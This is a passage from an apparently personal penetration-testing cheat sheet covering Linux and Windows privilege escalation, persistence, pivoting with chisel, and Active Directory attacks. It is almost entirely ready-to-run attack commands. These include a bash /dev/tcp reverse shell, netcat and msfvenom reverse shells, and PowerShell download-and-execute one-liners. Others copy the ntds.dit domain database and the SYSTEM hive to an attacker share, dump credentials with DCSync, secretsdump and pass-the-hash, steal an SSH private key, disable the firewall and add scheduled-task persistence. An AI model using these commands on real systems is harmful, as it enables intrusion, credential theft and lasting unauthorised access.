[https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl](https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl)

```bash
wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl
```

### GCC Error Fixes

[https://programmerah.com/gcc-error-trying-to-exec-cc1-execvp-no-such-file-or-directory-27405/](https://programmerah.com/gcc-error-trying-to-exec-cc1-execvp-no-such-file-or-directory-27405/)

> gcc: error trying to exec 'cc1': execvp: No such file or directory
> 

```bash
find /usr/ -name "*cc1*"
export PATH=$PATH:/usr/libexec/gcc/x86_64-redhat-linux/4.8.2/
```

### Kernel 3.0.0 exploit mempodipper

[https://www.exploit-db.com/exploits/18411](https://www.exploit-db.com/exploits/18411)

Not working? Use this.

[http://git.zx2c4.com/CVE-2012-0056/plain/mempodipper.c](http://git.zx2c4.com/CVE-2012-0056/plain/mempodipper.c)

### Polkit

```bash
wget https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py
```

### Postgresql authenticated arbitrary command execution

[https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)

### No Full Path specified

```bash
sudo PATH=/tmp:$PATH /opt/cleanup.sh
```

### Git config privilege escalation

Run linpeas.sh

```bash
cat .linpeas.txt | grep Github
```

Or

```bash
find / -name ".git" 2> /dev/null
```

CD to the path with “.git”

```bash
git log
```

Then git show the commit hash

```bash
git show 33a53ef9a207976d5ceceddc41a199558843bf3c
```

### Consul Privilege Escalation

```bash
echo 'chmod +s /usr/bin/bash' > /tmp/e.sh
```

```bash
curl --header "X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5" --request PUT -d '{"ID": "meow", "Name": "meow", "Address": "127.0.0.1", "Port": 80, "check": {"Args": ["/usr/bin/bash", "/tmp/e.sh"], "interval": "10s", "timeout": "1s"}}' http://127.0.0.1:8500/v1/agent/service/register
```

```bash
bash -p
```

### iPython Privilege Escalation

```bash
mkdir -m 777 /opt/scripts_review/profile_default/startup -p
```

```bash
echo "import os;os.system('cat /.ssh/id_rsa > ~/dan_smith.key')" > /opt/scripts_review/profile_default/startup/poc.py
```

cd to the home directory and we get a “.key” file

### Redis Privilege Escalation

Enumerate for password first, on the attacking machine:

```bash
rlwrap nc -nlvp 6379
```

On the target:

```bash
./redis_connector_dev
```

After getting the password, on the attacking machine:

```bash
rlwrap nc -nlvp 443
```

On the target:

```bash
echo "bash -i >& /dev/tcp/$kali_ip/443 0>&1" > /dev/shm/sh
```

```bash
redis-cli --pass $pass=Gqq
```

```bash
eval 'local l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = l(); local f = io.popen("cat /dev/shm/sh | bash"); local res = f:read("*a"); f:close(); return res' 0
```

### Linux 2.6.9 (CVE-2009-2698)

[https://github.com/xiaoxiaoleo/CVE-2009-2698](https://github.com/xiaoxiaoleo/CVE-2009-2698)

### RDS (CVE-2010-3904)

[https://github.com/m0mkris/linux-kernel-exploits/tree/master/2010/CVE-2010-3904](https://github.com/m0mkris/linux-kernel-exploits/tree/master/2010/CVE-2010-3904)

### BPF Sign Privilege Escalation (CVE-2017-16995)

[https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/cve-2017-16995](https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/cve-2017-16995)

### PwnKit (CVE-2021-4034)

[https://github.com/ly4k/PwnKit](https://github.com/ly4k/PwnKit)

### Dirtyc0w (CVE-2016-5195)

[https://github.com/firefart/dirtycow](https://github.com/firefart/dirtycow)

[https://github.com/th3-5had0w/DirtyCOW-PoC/blob/main/dirtycow](https://github.com/th3-5had0w/DirtyCOW-PoC/blob/main/dirtycow)

[https://github.com/Brucetg/DirtyCow-EXP/tree/master/Linux](https://github.com/Brucetg/DirtyCow-EXP/tree/master/Linux)

```bash
./dirtycow /etc/group "$(sed '/\(sudo*\)/ s/$/,www-data/' /etc/group)"
```

[https://github.com/Brucetg/DirtyCow-EXP/tree/master/Linux](https://github.com/Brucetg/DirtyCow-EXP/tree/master/Linux)

### Python Module Hijacking

[https://rastating.github.io/privilege-escalation-via-python-library-hijacking/](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/)

### PrivEsc Guide Windows

```bash
tasklist /svc
```

```bash
dir C:\
```

```bash
dir "C:\program files (x86)"
```

```bash
whoami /priv
```

```bash
netstat -nao
```

```bash
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

```bash
wmic qfe list
```

```bash
cmdkey /list
```

```bash
REG QUERY HKLM /f pass /t REG_SZ /s
```

```bash
REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" /v DefaultPassword
```

```bash
REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" /v DefaultPassword /reg:64
```

```bash
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### Vulnerable Privileges

- SeRestorePrivileges

```bash
mv C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old
```

```bash
mv C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
```

```bash
rdesktop $ip
```

Enter WIN Key + U

- SeBackupPrivileges

This only works if it is a DC, if this wasn't a domain controller, there would be no NTDS.dit file to get passwords from, so we
would need to download the SYSTEM, SAM and SECURITY files instead, read HTB Blackfield guide instead

[https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960](https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960)

```bash
wbadmin start backup -quiet -backuptarget:\\dc01\c$\users\svc_backup\Desktop -include:c:\windows\ntds
```

```bash
wbadmin get versions
```

```bash
wbadmin start recovery -quiet -version:01/04/2023-16:11 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:c:\users\svc_backup\desktop -notrestoreacl
```

```bash
reg save hklm\system c:\users\svc_backup\Desktop\system
```

```bash
copy ntds.dit \\$kali_ip\EVILSHARE\ntds.dit
```

```bash
copy system \\$kali_ip\EVILSHARE\system
```

```bash
python3 secretsdump.py -ntds ntds.dit -system system LOCAL | grep Administrator
```

- SeImpersonatePrivileges

### UAC Bypass

[https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/](https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/)

<aside>
💡 The user belongs to Administrators group but have only a few privileges

</aside>

1. Confirm that UAC is configured in the system

```bash
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System | findstr -i "ConsentPromptBehaviorAdmin EnableLUA PromptOnSecureDesktop"
```

> EnableLUA 0x1, PromptOnSecureDesktop 0x1, ConsentPromptBehaviorAdmin 0x0, 0x2 or 0x5.
> 

[https://www.tenforums.com/tutorials/112621-change-uac-prompt-behavior-administrators-windows.html](https://www.tenforums.com/tutorials/112621-change-uac-prompt-behavior-administrators-windows.html)

[https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/341747f5-6b5d-4d30-85fc-fa1cc04038d4](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/341747f5-6b5d-4d30-85fc-fa1cc04038d4)

1. Clone from

[https://github.com/turbo/zero2hero](https://github.com/turbo/zero2hero)

1. Ensure **eventvwr.exe** exists and has autoElevate set to true

```bash
.\strings64.exe -accepteula c:\windows\system32\eventvwr.exe | findstr -i autoelevate
```

1. Uncomment lines 66 and 69 and change line 68 to your msfvenom-generated filename, then compile.

```bash
x86_64-w64-mingw32-gcc main.c -o msword_backup.exe
```

1. Listen on the port specified by the msfvenom-generated filename and enjoy the shell.

### PrivescCheck

Great tool to enumerate based on hardware/installed software misconfiguration

[https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1](https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1)

```bash
wget https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1
```

```bash
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

### Sherlock

```bash
wget https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1
```

```bash
powershell "iex(new-object net.webclient).downloadString('http://$kali_ip/Sherlock.ps1');Find-AllVulns"
```

### PowerUp

An alternative to winPEAS

[https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1)

```bash
IEX(New-Object Net.WebClient).DownloadString("http://$kali_ip/PowerUp.ps1"); Invoke-AllChecks
```

### JAWS

An alternative to winPEAS

[https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1](https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1)

### LAPS

Is LAPS installed? Dump admin’s password.

[https://www.hackingarticles.in/credential-dumpinglaps/](https://www.hackingarticles.in/credential-dumpinglaps/)

[https://malicious.link/post/2017/dump-laps-passwords-with-ldapsearch/](https://malicious.link/post/2017/dump-laps-passwords-with-ldapsearch/)

```bash
ldapsearch -x -h $ip -D \          
"$domain\$username" -w '$password' -b "dc=$subdomain1,dc=$subdomain2" \
"(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```

Updated command

```bash
ldapsearch -x -H "ldap://$ip" -D "DOMAIN\user" -w 'password' -b "dc=DOMAIN,dc=COM" '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd
```

### Search for Unquoted Services

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

```bash
Import-Module .\PowerUp.ps1
Get-UnquotedService
```

[https://www.exploitblizzard.com/post/windows-privilege-escalation-exploiting-unquoted-service-path](https://www.exploitblizzard.com/post/windows-privilege-escalation-exploiting-unquoted-service-path)

[https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae](https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae)

[https://www.hackhappy.org/2018/04/18/windows-privilege-escalation-with-unquoted-services/](https://www.hackhappy.org/2018/04/18/windows-privilege-escalation-with-unquoted-services/)

### JuicyPotato all you need

<aside>
💡 Windows Server 2008, Windows 7, Windows Server 2008 R2 with SeImpersonatePrivilege might be vulnerable to JuicyPotato, CVE-2011-1249, CVE-2018-8120.

</aside>

Grab **JuicyPotato.exe** here:

[https://github.com/ivanitlearning/Juicy-Potato-x86/releases](https://github.com/ivanitlearning/Juicy-Potato-x86/releases)

If error, use random CLSD from

Use the uploaded nc.exe to get system shell

[https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise)

```powershell
JP.exe -t * -p c:\windows\system32\cmd.exe -a "/c c:\wamp\www\nc.exe -e cmd.exe $yourip $yourport" -l 9002 -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
```

### PrintSpoofer all you need

An alternative to JuicyPotato, where SeImpersonatePrivilege set and target OS is

```bash
Windows 8.1, Windows Server 2012 R2, Windows 10 and Windows Server 2019
```

```bash
wget https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe
```

```bash
PrintSpoofer.exe -i -c cmd
```

### Found custom program and want to analyze the program?

Trace library calls

```bash
ltrace <path/to/program>
```

### Windows netsh disable firewall

```bash
netsh advfirewall show allprofiles
```

```bash
netsh advfirewall set allprofiles state off
```

### Shutdown Windows System Command

```bash
shutdown -r -t 15 && exit
```

### Bloodhound & Sharphound Post-Exploit Privesc

[https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe)

On the target, run

```bash
.\SharpHound.exe --memcache -c all -d SUPPORT.HTB -DomainController 127.0.0.1
```

Download the ZIP file and on kali, run

```bash
neo4j console
```

Change password at [http://127.0.0.1:7474](http://127.0.0.1:7474) and then start bloodhound, then drag the ZIP file into bloodhound.

### Find flag proof.txt

```bash
dir /b /s proof.txt
```

# Persistence

### schtasks

```jsx
schtasks /create /sc minute /mo 1 /tn RAM_Booster /tr "c:\users\alice\Desktop\rev.exe" /ru system
```

```jsx
schtasks /run /tn "RAM_Booster"
```

## Pivoting

[https://posts.specterops.io/offensive-security-guide-to-ssh-tunnels-and-proxies-b525cbd4d4c6](https://posts.specterops.io/offensive-security-guide-to-ssh-tunnels-and-proxies-b525cbd4d4c6)

[https://blog.zsec.uk/proxying-offensive/](https://blog.zsec.uk/proxying-offensive/)

[https://medium.com/geekculture/forwarding-burp-suite-traffic-through-socks-proxy-bada1124341c](https://medium.com/geekculture/forwarding-burp-suite-traffic-through-socks-proxy-bada1124341c)

### SSH perm no password access

```bash
ssh-keygen
```

```bash
ssh-copy-id -i ~/.ssh/id_rsa.pub root@$ip
```

### SSH Persistent Access (can be transferred using RSYNC)

```bash
ssh-keygen -f username
```

```bash
cp username.pub .ssh/authorized_keys
```

```bash
chmod 600 username
```

```bash
rsync -av .ssh/ rsync://$ip/username/.ssh
```

```bash
ssh -i username username@$ip
```

### Static Binaries/Tools for Pivoting

[https://github.com/ernw/static-toolbox/releases](https://github.com/ernw/static-toolbox/releases)

### Metasploit (route add/portfwd)

[https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)

### Chisel Dynamic Port Forwarding

Server

```jsx
./chisel_1.7.7_linux_amd64 server -p 8000 --reverse
```

Client

```jsx
./chisel client $kali_ip:8000 R:socks
```

/etc/proxychains4.conf

```bash
socks5 	127.0.0.1 1080
```

Nmap

```jsx
proxychains nmap -Pn -sT -n --top-ports 10 $ip
```

Double Pivoting

[https://wikihak.com/double-pivoting-with-chisel/](https://wikihak.com/double-pivoting-with-chisel/)

[https://www.hdysec.com/double-pivoting-both-metasploit-and-manual/](https://www.hdysec.com/double-pivoting-both-metasploit-and-manual/)

Kali

```jsx
./chisel_1.7.7_linux_amd64 server --socks5 -p 8000 --reverse
```

Mid 1

```jsx
./chisel client $kali_ip:8000 R:8888:socks
```

```jsx
./chisel_1.7.7_linux_386 server --socks5 -p 445 --reverse
```

Mid 2

```jsx
./chisel_1.7.7_linux_386 client $mid1_ip:445 R:9999:socks
```

/etc/proxychains4.conf

```jsx
socks5 127.0.0.1 8888
socks5 127.0.0.1 9999
```

## Active Directory

[https://github.com/jenriquezv/OSCP-Cheat-Sheets-AD](https://github.com/jenriquezv/OSCP-Cheat-Sheets-AD)

[https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#domain-enumeration](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#domain-enumeration)

### Credentials at hand

There’s many things you can enumerate with low privileges credentials

```bash
rpcclient -U DOMAIN.COM/'user'%"password" $ip
```

```bash
python3 GetNPUsers.py domain.com/ -dc-ip $ip -usersfile usernames.txt -format hashcat -outputfile hashes.txt
```

```bash
python3 GetUserSPNs.py domain.com/user:"password" -dc-ip $ip -request
```

```bash
crackmapexec smb $ip -u 'user' -p 'password' -x "whoami"
```

```bash
crackmapexec smb $ip -u 'user' -p 'password' --shares
```

```bash
python3 secretsdump.py DOMAIN.COM/user:"password"@$ip
```

```bash
bloodhound-python -u user -p 'password' -d domain.com -ns $ip -c all --zip
```

### Attacking the DC directly (Kerberos I)

Always try [GetUserSPNs.py](http://GetUserSPNs.py) if you have creds

```bash
python3 GetUserSPNs.py domain.com/svc_tgs:password -dc-ip $ip -request
```

### Attacking the DC directly (Kerberos II)

Kerbrute to enum valid usernames

[https://github.com/ropnop/kerbrute/releases](https://github.com/ropnop/kerbrute/releases)

```bash
./kerbrute_linux_amd64 userenum -d domain.com /opt/SecLists/Usernames/xato-net-10-million-usernames.txt --dc $ip
```

Query ASREPRoastable accounts from the Key Distribution Center

```bash
python3 GetNPUsers.py domain.com/ -dc-ip $ip -usersfile valid_usernames.txt -format hashcat -outputfile hashes.txt
```

Crack hashes

```bash
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt --outfile="pw.txt"
```

List shares

```bash
smbclient -L //$ip --user=domain.com/admin%password
```

Retrieve password hashes

```bash
python3 secretsdump.py domain.com/admin:password@$ip
```

### Attacking the DC Directly (Responder - 80/445/1433) - NetNTLMv2 hash stealing

Web Service vulnerable to SSRF RFI we can use responder to steal NTLM credentials by running responder and forcing the target to connect to our web server

SMB Service that has Write permissions over a specific share we can upload a LNK, SCF or URL shortcut to point to our ico file in our local kali to steal NTLM hash

MSSQL Service that we can authenticate with could force the service to authenticate to our local kali to steal NTLM hash

```bash
responder -I tun0 -wv
```

SMB Exploit

[https://github.com/Plazmaz/LNKUp](https://github.com/Plazmaz/LNKUp)

```bash
pip2 install -r requirements.txt; python2 generate.py --host $kali_ip --type ntlm --output click.lnk
```

```bash
smbclient //$ip/$writableshare
```

```bash
put click.lnk
```

MSSQL Exploit, if xp_dirtree doesn’t work, try other commands in

[https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)

```bash
SQL> xp_dirtree '\\$kali_ip\blablabla'
```

### GenericWrite over Default Domain Policy? Use SharpGPOAbuse.exe

The rights can be identified in bloodhound or use the following commands to identify (PowerView.ps1) - must have GpoEditDeleteModifySecurity

```bash
Get-NetGPO
```

```bash
Get-GPPermission -Guid 31B2F340-016D-11D2-945F-00C02EB984F9 -TargetType User -TargetName $name
```

[https://github.com/byronkg/SharpGPOAbuse/releases](https://github.com/byronkg/SharpGPOAbuse/releases)

```bash
/SharpGPOAbuse.exe --AddLocalAdmin --UserAccount user --GPOName "Default Domain Policy"
```

```bash
gpupdate /force
```

```bash
python3 psexec.py user:password@$ip
```

### GenericWrite over a user? Disable Kerberos pre-auth

```python
Get-ADUser -Filter 'Name -like "Kim*"' | Set-ADAccountControl -doesnotrequirepreauth $true
```

### Server Operators Group to SYSTEM

```python
sc.exe config browser binpath="C:\Windows\System32\cmd.exe /c net user administrator P@ssw0rd"
```

Verify if the binary path was successfully changed, and restart the service, then log in using psexec.py

```python
sc.exe qc browser
sc.exe stop browser
sc.exe start browser
```

### WriteDACL over Domain? Create user and assign with DSYNC rights and dump hashes

```bash
net user evil P@ssw0rd /add /domain
```

```bash
net group "Exchange Windows Permissions" evil /add
```

```bash
net group "Remote Management Users" evil /add
```

```bash
$pw = ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force
```

```bash
$cred = New-Object System.Management.Automation.PSCredential('domain\user', $pw)
```

```bash
Add-ObjectACL -TargetIdentity "DC=domain,DC=com" -PrincipalIdentity evil -Rights DCSync -Credential $cred -Verbose
```

Dump secrets

```bash
python3 secretsdump.py DOMAIN.COM/evil:'P@ssw0rd'@$ip
```

Login using [psexec.py](http://psexec.py) pass the hash

```bash
python psexec.py -hashes 00000000000000000000000000000000:32213b11e6aa90eb43d32c72a07ceea6 Administrator@$ip
```

[https://www.alteredsecurity.com/post/a-primer-on-dcsync-attack-and-detection](https://www.alteredsecurity.com/post/a-primer-on-dcsync-attack-and-detection)

### WriteOwner over a privileged group?

Set him as the domain object owner of that group

```bash
Set-DomainObjectOwner -Identity 'CORE STAFF' -OwnerIdentity User -Cred $cred
```

Followed by granting all rights via the ACL

```bash
Add-DomainObjectAcl -TargetIdentity "CORE STAFF" -PrincipalIdentity User -Cred $cred -Rights All
```

Finally, add him into the group

```bash
Add-DomainGroupMember -Identity 'CORE STAFF' -Members 'User' -Cred $cred
```

### PowerShell Empire

[https://hackmag.com/security/powershell-empire/](https://hackmag.com/security/powershell-empire/)

### Kerberoasting (SPN)

[https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/](https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/)

[https://medium.com/@minix9800/evade-windows-defender-lateral-movement-to-domain-administrator-detection-e09bad251dfc](https://medium.com/@minix9800/evade-windows-defender-lateral-movement-to-domain-administrator-detection-e09bad251dfc)

```bash
START /B powershell -c "iex (New-Object System.Net.Webclient).DownloadString('http://%domain%/%psfile%');"
```

Kerberos Cheatsheet

[https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)

### Crackmapexec cheat sheet

[https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-cheatsheet/](https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-cheatsheet/)

### Pass-the-Hash all you need to know

[https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/](https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/)

[https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/](https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/)

```bash
python psexec.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 Administrator@$ip
```

### GMSA Passwords Retrieval

[https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/](https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/)

```bash
$gmsa = Get-ADServiceAccount -Identity <gmsa_acc> -Properties 'msds-managedpassword'
$mp = $gmsa.'msds-managedpassword'
$mp1 = ConvertFrom-ADManagedPasswordBlob $mp
```

[https://github.com/expl0itabl3/Toolies/blob/master/GMSAPasswordReader.exe](https://github.com/expl0itabl3/Toolies/blob/master/GMSAPasswordReader.exe)

```bash
.\GMSAPasswordReader.exe --accountname svc_apache
```

### Change domain user password (PowerShell PS Script)

```bash
$user = 'WEB$'
$passwd = $mp1.'CurrentPassword'
$secpass = ConvertTo-SecureString $passwd -AsPlainText -Force
$cred = new-object system.management.automation.PSCredential $user,$secpass
Invoke-Command -computername 127.0.0.1 -ScriptBlock {Set-ADAccountPassword -Identity
tristan.davies -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'Password1234!'
-force)} -Credential $cred
```

### Bypass Applocker & Convenant

You can just run your executables directly at the following location (AppLocker wouldn’t prevent anything that executes in that location)

```bash
C:\Windows\System32\spool\drivers\color
```

### DNSAdmins to SYSTEM

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$kali_ip LPORT=443 -f dll > wtv.dll
```

```bash
cmd /c dnscmd localhost /config /serverlevelplugindll \\$kali_ip\EVILSHARE\wtv.dll
```

```bash
sc.exe stop dns
```

```bash
sc.exe start dns
```

## Tools

### Wine Error

```bash
wine: could not load kernel32.dll, status c0000135
```

```bash
mkdir -p ~/myapp/prefix; export WINEPREFIX=$HOME/myapp/prefix; export WINEARCH=win32; export WINEPATH=$HOME/myapp; wineboot --init; winetricks
```

[https://forum.manjaro.org/t/wine-could-not-load-kernel32-dll-status-c0000135/69811/2](https://forum.manjaro.org/t/wine-could-not-load-kernel32-dll-status-c0000135/69811/2)

### Impacket Installation

```bash
git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
```

```bash
pip3 install -r /opt/impacket/requirements.txt
```

```bash
cd /opt/impacket/ && python3 ./setup.py install
```

### Bloodhound and Neo4j

```bash
apt install bloodhound neo4j
```

### Hashcat Password Cracking

Check the mode from here

[https://hashcat.net/wiki/doku.php?id=example_hashe](https://hashcat.net/wiki/doku.php?id=example_hashe)

[https://github.com/Plazmaz/LNKUp](https://github.com/Plazmaz/LNKUp)

Alternatively

```bash
hashcat -h | grep SHA-256
```

### Crack hashes (MD5, SHA)

```bash
hashcat -a0 -m 1400 $hash /usr/share/dict/rockyou.txt
```

```bash
john --format=Raw-SHA256 --wordlist=/usr/share/dict/rockyou.txt hash.txt
```

### Other Cheat Sheets

[https://reconshell.com/oscp-cheat-sheet/](https://reconshell.com/oscp-cheat-sheet/)

[https://gist.github.com/SleepyLctl/823c4d29f834a71ba995238e80eb15f9](https://gist.github.com/SleepyLctl/823c4d29f834a71ba995238e80eb15f9)

[https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)